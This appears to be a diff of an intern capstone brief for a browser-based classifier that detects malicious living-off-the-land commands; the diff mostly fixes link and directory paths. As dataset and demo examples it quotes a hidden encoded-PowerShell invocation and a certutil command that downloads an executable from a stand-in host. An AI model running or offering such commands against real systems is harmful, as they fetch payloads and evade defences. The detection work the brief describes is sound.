@@ -8,7 +8,7 @@
 
 > *"By July 24, 2026, Jarrett will ship a browser-based Living-Off-The-Land (LOTL) command classifier that distinguishes benign system-admin commands from malicious LOTL invocations on a curated dataset of ≥200 examples (50/50 balanced, drawn from MITRE Atomic Red Team and public admin-script corpora), achieving ≥85% accuracy on a held-out test set of ≥30 commands, with a confidence-threshold UI that exposes the precision/recall tradeoff visibly, and present it live in a 5-minute on-site demo during the final program week."*
 
-Source: [ADR-0003 § Capstone lanes](../../../claude-markdown-documents/ADRs/ADR-0003-summer-2026-curriculum-structure.md#3-capstone-lanes-with-a-smart-outcomes).
+Source: [ADR-0003 § Capstone lanes](../../../../claude-markdown-documents/ADRs/ADR-0003-summer-2026-curriculum-structure.md#3-capstone-lanes-with-a-smart-outcomes).
 
 ## What is LOTL and why does it matter?
 
@@ -31,7 +31,7 @@ References:
 ## What we'll provide
 
 - **L05 — Classification with confidence** (capability lesson, your required pick). Covers thresholds, ROC curves, the precision/recall tradeoff, and `ConfidenceClassifierELM`.
-- **Pre-curated dataset** at `examples/capstones/jarrett-lotl-classifier/data/lotl-commands.json` — Julian-owned in [IMPL-0003 Phase 1 step 8](../../../claude-markdown-documents/implementation-plans/IMPL-0003-summer-2026-curriculum-execution.md#phase-1--nolan-pilot--l04-l06-drafting-may-12--may-31-3-weeks). Schema:
+- **Pre-curated dataset** at `examples/intern-program/capstones/jarrett-lotl-classifier/data/lotl-commands.json` — Julian-owned in [IMPL-0003 Phase 1 step 8](../../../../claude-markdown-documents/implementation-plans/IMPL-0003-summer-2026-curriculum-execution.md#phase-1--nolan-pilot--l04-l06-drafting-may-12--may-31-3-weeks). Schema:
   ```json
   {
     "command": "powershell.exe -nop -w hidden -EncodedCommand SQBFAFgA...",
@@ -42,7 +42,7 @@ References:
   }
   ```
   Balanced ~50/50, ≥200 entries, with row-level source attribution.
-- **`FeatureCombinerELM` from `window.astermind`** — the right primitive for this problem because it lets you combine token-level encoding of the command string with engineered numeric features. See [src/tasks/FeatureCombinerELM.ts](../../../src/tasks/FeatureCombinerELM.ts) for the API.
+- **`FeatureCombinerELM` from `window.astermind`** — the right primitive for this problem because it lets you combine token-level encoding of the command string with engineered numeric features. See [src/tasks/FeatureCombinerELM.ts](../../../../src/tasks/FeatureCombinerELM.ts) for the API.
 - **A starter feature-extractor** — Julian will write the first 5–6 numeric features so you have a concrete pattern to extend. Examples: encoded-blob presence, suspicious-flag count, LolBAS-name presence, argument entropy, network-indicator presence.
 
 ## What you'll build
@@ -57,14 +57,14 @@ A static HTML page (`index.html`) + JS that:
 
 ## Acceptance checklist
 
-- [ ] Code lives at `examples/capstones/jarrett-lotl-classifier/` with `index.html`, `classifier.js`, `features.js`, and a `README.md` Sam could read cold.
+- [ ] Code lives at `examples/intern-program/capstones/jarrett-lotl-classifier/` with `index.html`, `classifier.js`, `features.js`, and a `README.md` Sam could read cold.
 - [ ] No server required — static HTML + JS only.
 - [ ] Uses `window.astermind.FeatureCombinerELM` (or a documented justification for using `IntentClassifier`/`ELM` instead — `FeatureCombinerELM` is the recommended fit).
 - [ ] Reads the bundled `data/lotl-commands.json`; does not require external dataset downloads at runtime.
 - [ ] **Held-out test accuracy ≥85%** on a fixed 30-command holdout (use a stable seed for the split — document the seed in the README).
 - [ ] The threshold slider is visible and updates a live precision/recall display on the held-out set.
 - [ ] The live input box accepts a pasted command and classifies it within 100ms; the confidence bar shows the model's certainty.
-- [ ] vitest tests under `tests/capstones/jarrett-lotl-classifier/` cover the feature-extractor functions (input → expected feature vector for 5 known commands).
+- [ ] vitest tests under `tests/intern-program/capstones/jarrett-lotl-classifier/` cover the feature-extractor functions (input → expected feature vector for 5 known commands).
 - [ ] `npm run build` and `npm test` both pass on a fresh clone.
 - [ ] 5-minute presentation exists at `presentation.md` (or in slides.json if you wrap it in the lesson scaffold). Demo includes:
   - One known-malicious command (e.g. `certutil.exe -urlcache -split -f http://x.com/p.exe p.exe`)
@@ -100,10 +100,10 @@ If multi-binary scope feels too wide, scope down to **encoded-PowerShell detecti
 - Same `FeatureCombinerELM` shape with fewer features.
 - Easier to verify; fewer judgment calls on labels.
 
-This is documented in [ADR-0003 § Jarrett — Browser LOTL command classifier](../../../claude-markdown-documents/ADRs/ADR-0003-summer-2026-curriculum-structure.md#3-capstone-lanes-with-a-smart-outcomes) as the official narrower alternative.
+This is documented in [ADR-0003 § Jarrett — Browser LOTL command classifier](../../../../claude-markdown-documents/ADRs/ADR-0003-summer-2026-curriculum-structure.md#3-capstone-lanes-with-a-smart-outcomes) as the official narrower alternative.
 
 ## Where this is enforced
 
-- **vitest** in `tests/capstones/jarrett-lotl-classifier/` (you write these).
+- **vitest** in `tests/intern-program/capstones/jarrett-lotl-classifier/` (you write these).
 - **Dry-run Jul 17** — Julian will paste 5 surprise commands (mix of benign + malicious not in your training set) and watch the classifications. Half-credit if any are wildly miscategorized.
 - **On-site Jul 24** — Sam will be invited to paste commands too.
